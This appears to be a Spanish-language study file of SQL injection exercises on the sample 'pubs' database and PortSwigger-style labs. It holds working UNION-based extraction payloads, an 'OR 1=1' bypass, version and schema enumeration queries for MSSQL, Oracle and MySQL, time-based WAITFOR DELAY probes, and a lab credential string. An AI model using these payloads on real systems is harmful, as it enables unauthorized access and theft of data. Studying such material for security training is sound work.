use pubs 

--- SACAR EL NUMERO DE COLUMNAS DE LA TABLA CON ORDER BY
SELECT * FROM authors where au_lname like 'White' 
-- supongamos que este es el comando de la query donde nos saca todas las columnas donde el nombre sea white
-- En total se nos listan 9 columnas, podemos sacarlo con order by
/*COMANDO INJECTADO */
SELECT * FROM authors where au_lname like 'white'ORDER BY 3-- -' ORDER BY 3 -- -'
-- Nos la ejecuta porque si quehay 3 columnas en la tabla
SELECT * FROM authors where au_lname like 'White' ORDER BY 3 -- -'
-- Nos la ejecuta porque NO HAY 10 columnas en la tabla
SELECT * FROM authors where au_lname like 'White' ORDER BY 10 -- -'
-- NO NOS DA ERROR PORQUE HAY 9 columnas en la tabla 
SELECT * FROM authors where au_lname like 'White' ORDER BY 9 -- -'


     ''1 OR 1=1--'
SELECT * FROM admin where password=''
--- SACAR LOS CAMPOS DE LA TABLA CON UNION SELECT Y INJECTAR UNA STRING
-- EN ESTE EJEMPLO NOS DEVUELVE LOS DATOS DE LAS 9 COLUMNAS ASI COMO LOS VALORES AÑADIDOS EN OTRA FILA NUEVA
SELECT * FROM authors where au_lname like 'White' UNIOn SELECT NULL,NULL,NULL,'stringinjectada',NULL,NULL,NULL,NULL,NULL-- -+ '

-- Msg 205, Level 16, State 1, Line 1
-- All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
SELECT * FROM authors where au_lname like 'White' UNIOn SELECT NULL,NULL,NULL-- -'
-- EN ESTE CASO nos devuelve error ya que no hay el mismo numero de columnas que de datos insertados


--- ESTRAER DBs, tablas y nombres de columnas

#Database names


-- DE NUEVO EN ESTE EJEMPLO DEBEMOS RELLENAR TODAS LAS COLUMNAS (9) PARA QUE NOS DEVUELVA LA INJECCION QUE ESTE CASO REALIZAMOS EN LA SEGUNDA COLUMNA
SELECT * FROM authors where au_lname like 'White' UNION SELECT Null,CONCAT(0x7c, schema_name, 0x7c),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata-- -- -'

-- EJEMPLO PARA MSSQL
SELECT * FROM authors where au_lname like 'White' UNION SELECT NULL, CONCAT(0x7c, name, 0x7c), NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM sys.databases-- '


| au_id        | au_lname   | au_fname | phone         | address          | city       | state | zip   | contract |
|--------------|------------|----------|---------------|------------------|-------------|-------|-------|----------|
| 172-32-1176  | White      | Johnson  | 408 496-7223  | 10932 Bigge Rd.  | Menlo Park  | CA    | 94025 | 1        |
| NULL         | AdmFincas  | NULL     | NULL          | NULL             | NULL        | NULL  | NULL  | NULL     |
| NULL         | HTB        | NULL     | NULL          | NULL             | NULL        | NULL  | NULL  | NULL     |
| NULL         | master     | NULL     | NULL          | NULL             | NULL        | NULL  | NULL  | NULL     |
| NULL         | model      | NULL     | NULL          | NULL             | NULL        | NULL  | NULL  | NULL     |
| NULL         | msdb       | NULL     | NULL          | NULL             | NULL        | NULL  | NULL  | NULL     |
| NULL         | pubs       | NULL     | NULL          | NULL             | NULL        | NULL  | NULL  | NULL     |
| NULL         | tempdb     | NULL     | NULL          | NULL             | NULL        | NULL  | NULL  | NULL     |


#Tables of a database

SELECT * FROM authors WHERE au_lname LIKE 'White' 
UNION 
SELECT NULL, NULL, NULL, CONCAT(0x7c, TABLE_NAME, 0x7c), NULL, NULL, NULL, NULL, NULL 
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA = 'dbo' AND TABLE_CATALOG = 'pubs'-- -' -- Especifica el esquema y el catálogo de la base de datos "pubs"



#Column names

SELECT *
FROM authors
WHERE au_lname LIKE 'White'
UNION
SELECT Null, Null, Null, CONCAT (0x7c, COLUMN_NAME, 0x7c), Null, Null, Null, Null, Null
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_CATALOG = 'pubs' AND TABLE_NAME = 'jobs'-- -'


| au_id        | au_lname | au_fname | phone         | address           | city       | state | zip   | contract |
|--------------|----------|----------|---------------|-------------------|-------------|-------|-------|----------|
| NULL         | NULL     | NULL     | |job_desc|    | NULL              | NULL        | NULL  | NULL  | NULL     |
| NULL         | NULL     | NULL     | |job_id|      | NULL              | NULL        | NULL  | NULL  | NULL     |
| NULL         | NULL     | NULL     | |max_lvl|     | NULL              | NULL        | NULL  | NULL  | NULL     |
| NULL         | NULL     | NULL     | |min_lvl|     | NULL              | NULL        | NULL  | NULL  | NULL     |
| 172-32-1176  | White    | Johnson  | 408 496-7223 | 10932 Bigge Rd.   | Menlo Park  | CA    | 94025 | 1        |



--- Me he fijado que no puedo itroducir el job_id en otro campo que no sea el de contract porque es de tipo bit


SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_SCHEMA = 'dbo'
  AND TABLE_NAME = 'authors'
  AND COLUMN_NAME = 'au_id'
  
| COLUMN_NAME | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH |
|-------------|-----------|-------------------------|
| au_id       | varchar   | 11                      |

SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_SCHEMA = 'dbo'
  AND TABLE_NAME = 'authors'
  AND COLUMN_NAME = 'contract'

--
| COLUMN_NAME | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH |
|-------------|-----------|-------------------------|
| contract    | bit       | NULL                    |


--
SELECT *
FROM authors
WHERE au_lname LIKE 'White' UNION SELECT job_desc, NULL, Null, NULL, Null, Null, Null, Null, job_id FROM jobs



administrator:z4t83aucd662d00bapz2
--SQL injection UNION attack, retrieving multiple values in a single column
UNION SELECT NULL, username ||':'|| password from users-- -

SELECT *
FROM authors
WHERE au_lname LIKE 'White' UNION SELECT job_desc + ':' + CAST(job_id AS varchar) + ':' + job_desc, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL
FROM jobs

--- SQL injection attack, querying the database type and version on Oracle
---https://0a7a003d03f8aa9080df1721006a0037.web-security-academy.net/filter?category=Food+%26+Drink%27UNION%20SELECT%20NULL,%20banner%20from%20v$version--%20-
Food & Drink'UNION SELECT NULL, banner from v$version-- -
-- -' FROM DUAL -- base de datos siempre presente en oracle


-- SQL injection attack, querying the database type and version on MySQL and Microsoft

Pets'UNION SELECT NULL, @@version-- -



-- ORACLE OSINT

'union select NULL,owner from all_tables-- -'
-- DUEÑOS DE LAS TABLAS

'union select NULL,table_name from all_tables where owner='DUEÑO'-- -'
--NOMBRES TABLAS

'union select NULL,column_name from all_tab_columns where table_name='tablita'-- -'
-- NOMBRES COLUMNAS



---- ATAQUES BASADOS EN TIEMPo


select Password from employee

//add passwords 


ALTER TABLE employee
ADD password NVARCHAR(20) NULL;



UPDATE employee
SET password = LEFT(CONVERT(varchar(255), NEWID()), 20);


--- INJECCION TIEMPO  WAITFOR DELAY '0:0:10' 
-- Si la base de datos que se esta usando empieza por 'p' la instruccion espera 10 segundos en completarse 
SELECT * FROM employee WHERE lname = 'Accorti' IF SUBSTRING(DB_NAME(), 1, 1) = 'p'  WAITFOR DELAY '00:00:10' -- -'

select SUBSTRING(database()1,1)
 SELECT password from employee 
 UION SELECT SUBSTRING(DB_NAME(), 1, 1) 